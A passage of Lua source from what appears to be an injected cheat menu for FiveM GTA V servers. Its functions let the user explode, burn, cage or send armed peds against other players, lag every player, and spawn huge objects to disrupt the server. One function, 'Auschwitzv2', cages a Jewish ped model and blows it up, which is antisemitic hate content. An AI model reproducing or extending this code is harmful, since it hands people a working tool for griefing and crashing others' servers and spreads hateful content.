       local blip = CockT.Inv["Invoke"](CockT.Natives["AddBlipForEntity"], p1)
       CockT.Inv["Invoke"](CockT.Natives["SetBlipAsFriendly"], blip, true)
       CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 1)
       CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 15)
   end
   
   CockT.Global.DoGangbangPlayer = function(player)
       for peds in Fatasf.n.EnumeratePeds() do
           if peds ~= Fatasf.n.PlayerPedId() then
               Fatasf.n.AttachEntityToEntity(peds, Fatasf.n.GetPlayerPed(player), Fatasf.n.GetPedBoneIndex(Fatasf.n.GetPlayerPed(player), 57005), 0, 0, -1.0, 0, 0, 0, false, true, true, true, 1, true)
           end
       end
   end
   --[[local GetAllLines = Fatasf.n.mathsplit(resource, "[^\n]+")
   if Fatasf.n.IsDisabledControlPressed(0, 14) and scroll > (0.2 - ((#GetAllLines-27) * 0.015)) then
       Cock.Menu.scr_a = Cock.Menu.scr_a - 0.015
   end
   if Fatasf.n.IsDisabledControlJustPressed(0, 15) and scroll ~= 0.2 then
       Cock.Menu.scr_a = Cock.Menu.scr_a + 0.015
   end]]
   
   CockT.Global.ScrollBar = function(scroll)
   end
   
   CockT.Global.GivePlayerArmy = function(player)
       for r = 0, 8 do
           local allmodels = {'s_m_y_blackops_01', 's_m_y_hwaycop_01', 's_m_y_blackops_03', 's_m_y_swat_01', 's_m_y_cop_01'}
           local model = Fatasf.n.GetHashKey(allmodels[CockT.Math.random(#allmodels)])
           Fatasf.n.RequestModel(model)
           if not Fatasf.n.HasModelLoaded(model) then 
               CockT.Inv["Wait"](80)
               Fatasf.n.RequestModel(model)
           end
           local ped = Fatasf.n.GetPlayerPed(player)
           local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(ped))
           local p1 = Fatasf.n.CreatePed(3, model, x, y, z, 1, true, true)
           CockT.Inv["Invoke"](CockT.Natives["TaskFollowToOffsetOfEntity"], p1, ped, 0.5, 0.0, 0.0, 5.0, -1, 0.0, 1)
           Fatasf.n.SetPedKeepTask(p1, true)
           local blip = CockT.Inv["Invoke"](CockT.Natives["AddBlipForEntity"], p1)
           CockT.Inv["Invoke"](CockT.Natives["SetBlipAsFriendly"], blip, true)
           CockT.Inv["Invoke"](CockT.Natives["SetBlipSprite"], blip, 1)
           CockT.Inv["Invoke"](CockT.Natives["SetBlipColour"], blip, 15)
           Fatasf.n.GiveWeaponToPed(p1, Fatasf.n.GetHashKey('weapon_vintagepistol'), 999, true, true)
       end
   end
   
   CockT.Global.Notifications = function(notify, text)
       notify = not notify
       local y = -0.2
           if notify then
               CockT.Inv["Thread"](function()
                   while notify do
                       CockT.Inv["Wait"](0)
                       if y < 0.35 then
                           y = y + 0.005
                       end
   
                       Fatasf.n.DrawSprite("commonmenu", "gradient_bgd", 0.5, y, 5.0, 0.18, 0.0, 255, 255, 255, 200)
                       CockT.Global.DrawText('~g~CockMenu', 0.42, y-0.07, false, 1.15, 7, false)
                       CockT.Global.DrawText(text, 0.5, y+0.01, false, 0.4, 6, true)
                   end    
               end)
               CockT.Inv["Wait"](1000)
               notify = false
           end
   end
   
   CockT.Global.RandomClothes = function()
       CockT.Inv["Thread"](function()
           CockT.Inv["Invoke"](CockT.Natives['SetPedRandomComponentVariation'], Fatasf.n.PlayerPedId(), false)
           CockT.Inv["Invoke"](CockT.Natives['SetPedRandomProps'], Fatasf.n.PlayerPedId())
       end)
   end
   CockT.Global.EarRape = function()
       --CockT.Inv["Thread"](function()
           Fatasf.n.PlaySound(-1, 'Checkpoint_Hit', 'GTAO_FM_Events_Soundset', true)
           Fatasf.n.PlaySound(-1, 'Boss_Blipped', 'GTAO_Magnate_Hunt_Boss_SoundSet', true)
           --Fatasf.n.PlaySound(-1, 'Bomb_Disarmed', 'GTAO_Speed_Convoy_Soundset', true)
           Fatasf.n.PlaySound(-1, 'All', 'SHORT_PLAYER_SWITCH_SOUND_SET', true)
           --Fatasf.n.PlaySound(-1, 'SELECT', 'HUD_MINI_GAME_SOUNDSET', true)
       --end)
   end
   CockT.Global.redENGINEsign = function(player, offsetZ)
       Fatasf.n.SetEntityCoords(Fatasf.n.PlayerPedId(), -70.79, -695.51, 49.48)
       CockT.Inv["Thread"](function()
           local hash = Fatasf.n.GetHashKey("prop_container_05a")
           local coords1 = {x=-48.83, y=-755.07, z=114.01}; c_obj1 = Fatasf.n.CreateObject(hash, coords1.x, coords1.y, coords1.z, true, true, true)
           local coords2 = {x=-48.83, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj2 = Fatasf.n.CreateObject(hash, coords2.x, coords2.y, coords2.z, true, true, true)
           local coords3 = {x=-48.83, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj3 = Fatasf.n.CreateObject(hash, coords3.x, coords3.y, coords3.z, true, true, true)
           local coords4 = {x=-50.50, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj4 = Fatasf.n.CreateObject(hash, coords4.x, coords4.y, coords4.z, true, true, true)
           local coords5 = {x=-52.70, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj5 = Fatasf.n.CreateObject(hash, coords5.x, coords5.y, coords5.z, true, true, true)
           local coords6 = {x=-60.0, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj6 = Fatasf.n.CreateObject(hash, coords6.x, coords6.y, coords6.z, true, true, true)
           local coords7 = {x=-60.0, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj7 = Fatasf.n.CreateObject(hash, coords7.x, coords7.y, coords7.z, true, true, true)
           local coords8 = {x=-60.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj8 = Fatasf.n.CreateObject(hash, coords8.x, coords8.y, coords8.z, true, true, true)
           local coords9 = {x=-60.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj9 = Fatasf.n.CreateObject(hash, coords9.x, coords9.y, coords9.z, true, true, true)
           local coords9b = {x=-60.0, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj9b = Fatasf.n.CreateObject(hash, coords9b.x, coords9b.y, coords9b.z, true, true, true)
           local coords10 = {x=-62.5, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj10 = Fatasf.n.CreateObject(hash, coords10.x, coords10.y, coords10.z, true, true, true)
           local coords11 = {x=-65.0, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj11 = Fatasf.n.CreateObject(hash, coords11.x, coords11.y, coords11.z, true, true, true)
           local coords12 = {x=-62.5, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj12 = Fatasf.n.CreateObject(hash, coords12.x, coords12.y, coords12.z, true, true, true)
           local coords13 = {x=-65.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj13 = Fatasf.n.CreateObject(hash, coords13.x, coords13.y, coords13.z, true, true, true)
           local coords14 = {x=-62.5, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj14 = Fatasf.n.CreateObject(hash, coords14.x, coords14.y, coords14.z, true, true, true)
           local coords15 = {x=-65.0, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj15 = Fatasf.n.CreateObject(hash, coords15.x, coords15.y, coords15.z, true, true, true)
           local coords16 = {x=-75.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj16 = Fatasf.n.CreateObject(hash, coords16.x, coords16.y, coords16.z, true, true, true)
           local coords17 = {x=-73.0, y=-755.07, z=117.51}; CockT.Inv["Wait"](80); local c_obj17 = Fatasf.n.CreateObject(hash, coords17.x, coords17.y, coords17.z, true, true, true)
           local coords18 = {x=-73.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj18 = Fatasf.n.CreateObject(hash, coords18.x, coords18.y, coords18.z, true, true, true)
           local coords19 = {x=-77.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj19 = Fatasf.n.CreateObject(hash, coords19.x, coords19.y, coords19.z, true, true, true)
           local coords20 = {x=-77.0, y=-755.07, z=117.51}; CockT.Inv["Wait"](80); local c_obj20 = Fatasf.n.CreateObject(hash, coords20.x, coords20.y, coords20.z, true, true, true)
           local coords21 = {x=-85.0, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj21 = Fatasf.n.CreateObject(hash, coords21.x, coords21.y, coords21.z, true, true, true)
           local coords22 = {x=-87.5, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj22 = Fatasf.n.CreateObject(hash, coords22.x, coords22.y, coords22.z, true, true, true)
           local coords23 = {x=-90.0, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj23 = Fatasf.n.CreateObject(hash, coords23.x, coords23.y, coords23.z, true, true, true)
           local coords24 = {x=-85.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj24 = Fatasf.n.CreateObject(hash, coords24.x, coords24.y, coords24.z, true, true, true)
           local coords25 = {x=-85.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj25 = Fatasf.n.CreateObject(hash, coords25.x, coords25.y, coords25.z, true, true, true)
           local coords26 = {x=-87.5, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj26 = Fatasf.n.CreateObject(hash, coords26.x, coords26.y, coords26.z, true, true, true)
           local coords27 = {x=-90.0, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj27 = Fatasf.n.CreateObject(hash, coords27.x, coords27.y, coords27.z, true, true, true)
           local coords28 = {x=-100.0, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj28 = Fatasf.n.CreateObject(hash, coords28.x, coords28.y, coords28.z, true, true, true)
           local coords29 = {x=-100.0, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj29 = Fatasf.n.CreateObject(hash, coords29.x, coords29.y, coords29.z, true, true, true)
           local coords30 = {x=-100.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj30 = Fatasf.n.CreateObject(hash, coords30.x, coords30.y, coords30.z, true, true, true)
           local coords31 = {x=-100.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj31 = Fatasf.n.CreateObject(hash, coords31.x, coords31.y, coords31.z, true, true, true)
           local coords32 = {x=-101.5, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj32 = Fatasf.n.CreateObject(hash, coords32.x, coords32.y, coords32.z, true, true, true)
           local coords33 = {x=-103.5, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj33 = Fatasf.n.CreateObject(hash, coords33.x, coords33.y, coords33.z, true, true, true)
           local coords34 = {x=-105.5, y=-755.07, z=124.01}; CockT.Inv["Wait"](80); local c_obj34 = Fatasf.n.CreateObject(hash, coords34.x, coords34.y, coords34.z, true, true, true)
           local coords35 = {x=-107.0, y=-755.07, z=121.51}; CockT.Inv["Wait"](80); local c_obj35 = Fatasf.n.CreateObject(hash, coords35.x, coords35.y, coords35.z, true, true, true)
           local coords36 = {x=-107.0, y=-755.07, z=119.01}; CockT.Inv["Wait"](80); local c_obj36 = Fatasf.n.CreateObject(hash, coords36.x, coords36.y, coords36.z, true, true, true)
           local coords37 = {x=-107.0, y=-755.07, z=116.51}; CockT.Inv["Wait"](80); local c_obj37 = Fatasf.n.CreateObject(hash, coords37.x, coords37.y, coords37.z, true, true, true)
           local coords38 = {x=-107.0, y=-755.07, z=114.01}; CockT.Inv["Wait"](80); local c_obj38 = Fatasf.n.CreateObject(hash, coords38.x, coords38.y, coords38.z, true, true, true)
           Fatasf.n.FreezeEntityPosition(c_obj1, true) Fatasf.n.FreezeEntityPosition(c_obj2, true)
           Fatasf.n.FreezeEntityPosition(c_obj3, true) Fatasf.n.FreezeEntityPosition(c_obj4, true)
           Fatasf.n.FreezeEntityPosition(c_obj5, true) Fatasf.n.FreezeEntityPosition(c_obj6, true)
           Fatasf.n.FreezeEntityPosition(c_obj7, true) Fatasf.n.FreezeEntityPosition(c_obj8, true)
           Fatasf.n.FreezeEntityPosition(c_obj9, true) Fatasf.n.FreezeEntityPosition(c_obj10, true)
           Fatasf.n.FreezeEntityPosition(c_obj11, true) Fatasf.n.FreezeEntityPosition(c_obj12, true)
           Fatasf.n.FreezeEntityPosition(c_obj13, true) Fatasf.n.FreezeEntityPosition(c_obj14, true)
           Fatasf.n.FreezeEntityPosition(c_obj15, true) Fatasf.n.FreezeEntityPosition(c_obj16, true)
           Fatasf.n.FreezeEntityPosition(c_obj17, true) Fatasf.n.FreezeEntityPosition(c_obj18, true)
           Fatasf.n.FreezeEntityPosition(c_obj19, true) Fatasf.n.FreezeEntityPosition(c_obj20, true)
   
           Fatasf.n.FreezeEntityPosition(c_obj21, true) Fatasf.n.FreezeEntityPosition(c_obj22, true)
           Fatasf.n.FreezeEntityPosition(c_obj23, true) Fatasf.n.FreezeEntityPosition(c_obj24, true)
           Fatasf.n.FreezeEntityPosition(c_obj25, true) Fatasf.n.FreezeEntityPosition(c_obj26, true)
           Fatasf.n.FreezeEntityPosition(c_obj27, true) Fatasf.n.FreezeEntityPosition(c_obj28, true)
           Fatasf.n.FreezeEntityPosition(c_obj29, true) Fatasf.n.FreezeEntityPosition(c_obj30, true)
           Fatasf.n.FreezeEntityPosition(c_obj31, true) Fatasf.n.FreezeEntityPosition(c_obj32, true)
           Fatasf.n.FreezeEntityPosition(c_obj33, true) Fatasf.n.FreezeEntityPosition(c_obj34, true)
           Fatasf.n.FreezeEntityPosition(c_obj35, true) Fatasf.n.FreezeEntityPosition(c_obj36, true)
           Fatasf.n.FreezeEntityPosition(c_obj37, true) Fatasf.n.FreezeEntityPosition(c_obj38, true)
       end)
   end
   CockT.Global.CageNew = function(player)
       CockT.Inv["Thread"](function()
           if player then
               local coords = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player))
               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_conc_sacks_02a"), coords.x, coords.y, coords.z +0.5, true, true, true)
               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_conc_sacks_02a"), coords.x, coords.y-0.6, coords.z-1.3, true, true, true)
               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_conc_sacks_02a"), coords.x, coords.y+0.6, coords.z-1.3, true, true, true)
               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_conc_sacks_02a"), coords.x+1.5, coords.y, coords.z-1.3, true, true, true)
               Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_conc_sacks_02a"), coords.x-1.5, coords.y, coords.z-1.3, true, true, true)
           end
       end)
   end
   CockT.Global.TeleportToPlayer = function(player)
       Fatasf.n.SetEntityCoords(Fatasf.n.PlayerPedId(), Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)))
   end
   CockT.Global.CopyOutfit = function(player)
       local model = Fatasf.n.GetEntityModel(Fatasf.n.GetPlayerPed(player))
       CockT.Inv["Invoke"](CockT.Natives['SetPlayerModel'], Fatasf.n.PlayerId(), model)
       CockT.Inv["Wait"](100)
       CockT.Inv["Invoke"](CockT.Natives['ClonePedToTarget'], Fatasf.n.GetPlayerPed(player),Fatasf.n.PlayerPedId())
   end
   CockT.Global.ExplodePlayer = function(player)
       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 1, 100.0, true, false, 0.0)
   end
   CockT.Global.MolotovPlayer = function(player)
       Fatasf.n.AddExplosion(Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(player)), 3, 100.0, true, false, 0.0)
   end
   
   CockT.Global.Auschwitzv2 = function(pped)
       CockT.Inv["Thread"](function()
           if pped then
               local coords1 = Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(pped))
               local coords = {x=coords1.x+2.0, y=coords1.y, z=coords1.z}
               local obj = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z - 1, 1, 1, 1)
               Fatasf.n.FreezeEntityPosition(obj, true) 
               local obj2 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z - 1, 1, 1, 1)
               Fatasf.n.SetEntityHeading(obj2, 90.0) 
               Fatasf.n.FreezeEntityPosition(obj2, true)
               local obj3 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z - 1, 1, 1, 1)
               Fatasf.n.FreezeEntityPosition(obj3, true)
               local obj4 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z - 1, 1, 1, 1)
               Fatasf.n.SetEntityHeading(obj4, 90.0)
               Fatasf.n.FreezeEntityPosition(obj4, true)
               local obj5 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y - 1, coords.z + 1.5, 1, 1, 1)
               Fatasf.n.FreezeEntityPosition(obj5, true)
               local obj6 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.55, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
               Fatasf.n.SetEntityHeading(obj6, 90.0)
               Fatasf.n.FreezeEntityPosition(obj6, true)
               local obj7 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x - 0.6, coords.y + 0.6, coords.z + 1.5, 1, 1, 1)
               Fatasf.n.FreezeEntityPosition(obj7, true)
               local obj8 = Fatasf.n.CreateObject(Fatasf.n.GetHashKey("prop_fnclink_03gate5"), coords.x + 1.05, coords.y - 1.05, coords.z + 1.5, 1, 1, 1)
               Fatasf.n.SetEntityHeading(obj8, 90.0)
               Fatasf.n.FreezeEntityPosition(obj8, true)
               
               local ped = Fatasf.n.GetHashKey('a_m_m_hasjew_01')
               Fatasf.n.RequestModel(ped)
               while not Fatasf.n.HasModelLoaded(ped) do
                   CockT.Inv["Wait"](1)
               end
               local _ped_ = Fatasf.n.CreatePed(31, ped, coords.x, coords.y, coords.z, 0.0, true, true)
   
               Fatasf.n.AddExplosion(coords.x, coords.y, coords.z, 3, 100.0, true, false, 0.0) 
           end
       end)
   end
   CockT.Global.LagAllPlayers = function()
       for k, i in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do 
            local ped = Fatasf.n.GetPlayerPed(i)
            Fatasf.n.RequestNamedPtfxAsset("scr_agencyheist")
            local pedcoords = Fatasf.n.GetEntityCoords(ped)
            Fatasf.n.UseParticleFxAsset("scr_agencyheist")
            Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_fbi_dd_breach_smoke", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
            
            Fatasf.n.RequestNamedPtfxAsset("core")
            Fatasf.n.UseParticleFxAsset("core")
            Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "exp_air_molotov", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
        
            Fatasf.n.RequestNamedPtfxAsset("scr_rcbarry1")
            Fatasf.n.UseParticleFxAsset("scr_rcbarry1")
            Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord( "scr_alien_teleport", pedcoords, 0.0, 0.0, 0.0, 10.0, false, false, false, false)
        end
    end
   CockT.Global.FuckServer = function()
       for k, v in CockT.Math.pairs(Fatasf.n.GetActivePlayers()) do
           Fatasf.n.CreateObject(Fatasf.n.GetHashKey('cs4_lod_01_slod3'), Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v)), true, true, true)
           Fatasf.n.CreateObject(Fatasf.n.GetHashKey('xm_prop_x17_osphatch_40m'), Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v)), true, true, true)
           Fatasf.n.CreateObject(Fatasf.n.GetHashKey('p_spinning_anus_s'), Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v)), true, true, true)
           Fatasf.n.CreateObject(Fatasf.n.GetHashKey('prop_bmu_01_b'), Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(v)), true, true, true)
       end
   end
   
   CockT.Global.SpawnKillingMexico = function(onplayer)
       for s = 0, 5 do
           local ped = Fatasf.n.GetHashKey('u_m_y_mani')
           Fatasf.n.RequestModel(ped)
           while not Fatasf.n.HasModelLoaded(ped) do
               CockT.Inv["Wait"](1)
           end
           local ped_2 = Fatasf.n.CreatePed(31, ped, Fatasf.n.GetEntityCoords(Fatasf.n.GetPlayerPed(onplayer)), 0.0, true, true)
   
           Fatasf.n.GiveWeaponToPed(ped_2, Fatasf.n.GetHashKey('weapon_smg'), 999, true, true)
           --CockT.Inv["Invoke"](CockT.Natives['SetPlayerAngry'], ped_2, true)
           CockT.Inv["Invoke"](CockT.Natives["TaskCombatPed"], ped_2, Fatasf.n.GetPlayerPed(onplayer), 0,16)
       end
   end
   CockT.Global.ExplodeMissionrow = function()
       local ppid = Fatasf.n.PlayerPedId()
       Fatasf.n.AddExplosion(430.32, -955.59, 25.79, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(438.78, -996.59, 25.78, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(450.05, -996.19, 25.75, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(446.03, -984.07, 24.32, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(437.19, -982.93, 30.45, 5, 100.0, true, false, 0.0)
   
       Fatasf.n.AddExplosion(442.93, -976.55, 30.54, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(449.12, -975.65, 31.14, 5, 100.0, true, false, 0.0)
   
       Fatasf.n.AddExplosion(461.25, -979.71, 31.43, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(452.14, -989.51, 31.18, 5, 100.0, true, false, 0.0)
   
       Fatasf.n.AddExplosion(460.3, -991.71, 31.17, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(463.45, -984.23, 31.92, 5, 100.0, true, false, 0.0)
       Fatasf.n.AddExplosion(431.0, -1017.84, 28.69, 5, 100.0, true, false, 0.0)
   
   
       local gox_dict = "scr_trevor3"					
       Fatasf.n.RequestNamedPtfxAsset(gox_dict)					
       while not Fatasf.n.HasNamedPtfxAssetLoaded(gox_dict) do						
           CockT.Inv["Wait"](10)				
       end
       Fatasf.n.UseParticleFxAsset(gox_dict)
       Fatasf.n.StartNetworkedParticleFxNonLoopedAtCoord("scr_trev3_c4_explosion", 430.32, -955.59, 25.79,0,0,0,100.0,0,0,0)
   end
   
   CockT.Global.DrawBorderedRect = function(x, y, w, h, colour)
       Fatasf.n.DrawRect(x, y - (h / 2), w, 0.001, colour.r, colour.g, colour.b, colour.a) 
       Fatasf.n.DrawRect(x, y + (h / 2), w, 0.001, colour.r, colour.g, colour.b, colour.a) 
       Fatasf.n.DrawRect((x - (w / 2)), y, 0.0005, h, colour.r, colour.g, colour.b, colour.a)  
       Fatasf.n.DrawRect((x + (w / 2)), y, 0.0005, h, colour.r, colour.g, colour.b, colour.a) 
   end
   CockT.Global.TuningRamp = function()
       CockT.Inv["Thread"](function()
           local vehicle = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
           local prop = Fatasf.n.GetHashKey('prop_jetski_ramp_01')
           local x, y, z = CockT.Strings.tunpack(Fatasf.n.GetEntityCoords(vehicle, true))
           local _p = Fatasf.n.CreateObject(prop, x, y, z, true, true, false)
           --Fatasf.n.FreezeEntityPosition(_p, true)
           Fatasf.n.AttachEntityToEntity(_p, vehicle, Fatasf.n.GetPedBoneIndex(vehicle, 0), 0.0, 2.5, 0.5, 180.0, 180.0, 0, false, true, true, false, 2, true)
       end)
   end
   CockT.Global.MaxTuning = function()
       local vehicle = Fatasf.n.GetVehiclePedIsUsing(Fatasf.n.PlayerPedId())
       Fatasf.n.SetVehicleModKit(vehicle, 0) Fatasf.n.ToggleVehicleMod(vehicle, 18, 1)
       Fatasf.n.ToggleVehicleMod(vehicle, 22, 1) Fatasf.n.SetVehicleMod(vehicle, 16, 5, 0)
       Fatasf.n.SetVehicleMod(vehicle, 12, 2, 0) Fatasf.n.SetVehicleMod(vehicle, 11, 3, 0) 
       --Fatasf.n.SetVehicleMod(vehicle, 14, 14, 0) 
       Fatasf.n.SetVehicleMod(vehicle, 15, 3, 0)
       Fatasf.n.SetVehicleMod(vehicle, 13, 2, 0) Fatasf.n.SetVehicleWindowTint(vehicle, 5)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleWheelType'], vehicle, 0) Fatasf.n.SetVehicleMod(vehicle, 23, 21, 1)
       Fatasf.n.SetVehicleMod(vehicle, 0, 1, 0) Fatasf.n.SetVehicleMod(vehicle, 1, 1, 0)
       Fatasf.n.SetVehicleMod(vehicle, 2, 1, 0) Fatasf.n.SetVehicleMod(vehicle, 3, 1, 0)
       Fatasf.n.SetVehicleMod(vehicle, 4, 1, 0) Fatasf.n.SetVehicleMod(vehicle, 5, 1, 0)
       Fatasf.n.SetVehicleMod(vehicle, 6, 1, 0) Fatasf.n.SetVehicleMod(vehicle, 7, 1, 0)
       Fatasf.n.SetVehicleMod(vehicle, 8, 1, 0) Fatasf.n.SetVehicleMod(vehicle, 9, 1, 0)
       Fatasf.n.SetVehicleMod(vehicle, 10, 1, 0) Fatasf.n.IsVehicleNeonLightEnabled(vehicle, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 0, 1) CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 1, 1) 
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 2, 1) CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 3, 1) CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 4, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 5, 1) CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 6, 1)
       CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightEnabled'], vehicle, 7, 1) CockT.Inv["Invoke"](CockT.Natives['SetVehicleNeonLightsColour'], vehicle, 255, 255, 255)
       Fatasf.n.SetVehicleModKit(vehicle, 0) Fatasf.n.ToggleVehicleMod(vehicle, 20, 1)
       Fatasf.n.SetVehicleModKit(vehicle, 0) CockT.Inv["Invoke"](CockT.Natives['SetVehicleTyreSmokeColor'], vehicle, 0, 255, 255)
       Fatasf.n.SetVehicleModKit(vehicle, 0) Fatasf.n.SetVehicleMod(vehicle, 11, Fatasf.n.GetNumVehicleMods(vehicle, 11) - 1, false)
       Fatasf.n.SetVehicleMod(vehicle, 12, Fatasf.n.GetNumVehicleMods(vehicle, 12) - 1, false) Fatasf.n.SetVehicleMod(vehicle, 13, Fatasf.n.GetNumVehicleMods(vehicle, 13) - 1, false)
       Fatasf.n.SetVehicleMod(vehicle, 15, Fatasf.n.GetNumVehicleMods(vehicle, 15) - 2, false) Fatasf.n.SetVehicleMod(vehicle, 16, Fatasf.n.GetNumVehicleMods(vehicle, 16) - 1, false)
       Fatasf.n.ToggleVehicleMod(vehicle, 17, true) Fatasf.n.ToggleVehicleMod(vehicle, 18, true)
       Fatasf.n.ToggleVehicleMod(vehicle, 19, true) Fatasf.n.ToggleVehicleMod(vehicle, 21, true)
       Fatasf.n.SetVehicleTyresCanBurst(vehicle, true)
   end
   CockT.Global.PerformanceTuning = function(vehicle)
       Fatasf.n.SetVehicleModKit(vehicle, 0)
       Fatasf.n.SetVehicleMod(vehicle, 11, Fatasf.n.GetNumVehicleMods(vehicle, 11) - 1, false)
       Fatasf.n.SetVehicleMod(vehicle, 12, Fatasf.n.GetNumVehicleMods(vehicle, 12) - 1, false)
       Fatasf.n.SetVehicleMod(vehicle, 13, Fatasf.n.GetNumVehicleMods(vehicle, 13) - 1, false)
       Fatasf.n.SetVehicleMod(vehicle, 15, Fatasf.n.GetNumVehicleMods(vehicle, 15) - 2, false)
       Fatasf.n.SetVehicleMod(vehicle, 16, Fatasf.n.GetNumVehicleMods(vehicle, 16) - 1, false)
       Fatasf.n.ToggleVehicleMod(vehicle, 17, true)
       Fatasf.n.ToggleVehicleMod(vehicle, 18, true)
       Fatasf.n.ToggleVehicleMod(vehicle, 19, true)
       Fatasf.n.ToggleVehicleMod(vehicle, 21, true)
   end
   
   CockT.Global.CockText = function(name,_outl,size,Justification,xx,yy, font)
       if not font then
           font = 0
       end
       if _outl then
           Fatasf.n.SetTextOutline()
       end
       Fatasf.n.SetTextFont(font)
       Fatasf.n.SetTextProportional(1)
       Fatasf.n.SetTextScale(100.0, size)
       Fatasf.n.SetTextEdge(1, 0, 0, 0, 255)
       Fatasf.n.BeginTextCommandDisplayText("STRING")
       Fatasf.n.AddTextComponentSubstringWebsite(name)
       Fatasf.n.EndTextCommandDisplayText(xx, yy)
   end
   
   CockT.Global.RotToQuat = function(rot)
       local pitch = CockT.Math.rad(rot.x)
       local roll = CockT.Math.rad(rot.y)
       local yaw = CockT.Math.rad(rot.z)
       local cy = CockT.Math.cos(yaw * 0.5)
       local sy = CockT.Math.sin(yaw * 0.5)
       local cr = CockT.Math.cos(roll * 0.5)
       local sr = CockT.Math.sin(roll * 0.5)
       local cp = CockT.Math.cos(pitch * 0.5)
       local sp = CockT.Math.sin(pitch * 0.5)
       return quat(cy * cr * cp + sy * sr * sp, cy * sp * cr - sy * cp * sr, cy * cp * sr + sy * sp * cr, sy * cr * cp - cy * sr * sp)
   end
